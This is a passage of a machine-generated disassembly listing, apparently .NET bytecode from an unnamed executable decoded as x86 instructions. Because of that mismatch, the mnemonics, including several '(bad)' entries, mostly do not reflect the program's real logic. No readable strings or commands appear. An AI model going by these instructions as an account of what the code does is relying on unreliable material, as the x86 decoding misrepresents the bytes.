  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 f9 20 00       	and    $0x20f972,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 07                	jb     0x403081
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 11 21 00       	and    $0x211172,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
